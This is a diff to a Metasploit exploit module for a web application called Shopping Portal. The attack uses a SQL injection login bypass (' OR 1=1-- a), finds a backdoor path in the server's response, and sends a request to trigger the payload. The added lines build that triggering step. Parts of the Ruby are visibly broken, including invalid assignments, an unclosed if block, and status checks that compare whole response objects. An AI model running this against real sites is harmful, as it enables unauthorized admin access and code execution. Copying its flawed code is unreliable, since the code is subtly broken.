@@ -23,8 +23,8 @@ class Metasploit3 < Msf::Exploit::Remote
       'License'        => MSF_LICENSE,
       'Author'         =>
         [
-          'Ümit Yalçın', # Discovery
-          'D3duct1V <d3duct1v3[at]gmail.com>' # Metasploit
+          'Ümit Yalçın', # Discoverer
+          'D3duct1V <d3duct1v3[at]gmail.com>' # Metasploit author
         ],
       'References'     =>
         [
@@ -46,7 +46,7 @@ class Metasploit3 < Msf::Exploit::Remote
 
       register_options(
         [
-          OptString.new('TARGETURI', [true, 'The base path to Shopping Portal', '/admin/'])
+          OptString.new('TARGETURI', [true, 'The base path to Shopping Portal', '/shopping/'])
         ], self.class)
   end
 
@@ -60,8 +60,10 @@ class Metasploit3 < Msf::Exploit::Remote
   def run
     user => '\' OR 1=1-- a'
     pass => ""
+    base_uri = target_uri.path
+    target_uri.path = target_uri + 'admin/'
     res = send_request_cgi(
-        'uri' => normalize_uri('TARGETURI'),
+        'uri' => normalize_uri(target_uri.path),
         'method' => 'POST',
         'vars_post' => {
             'username' => user,
@@ -101,6 +103,21 @@ class Metasploit3 < Msf::Exploit::Remote
         'uri' => normalize_uri(target_uri.path, 'data' => search_json)
     })
     if res3 != 200
+        vprint_debug("#{peer} - Received response: #{res.code} - #{res.body}")
+        fail_with(Failure::Unknown, "#{peer} - Something went wrong")
+    the_line = ""
+    res3.body.each_line { |line|
+      if line =~ /admin/ then
+        the_line = line
+      end
+    }
+    # Trigger payload
+    backdoor_path = base_uri + the_line.split('"')[5]
+    res4 = send_request_raw({
+      'method' => 'GET',
+      'uri' => normalize_uri(backdoor_path)
+    })
+    if res4 != 200
         vprint_debug("#{peer} - Received response: #{res.code} - #{res.body}")
         fail_with(Failure::Unknown, "#{peer} - Something went wrong")
 
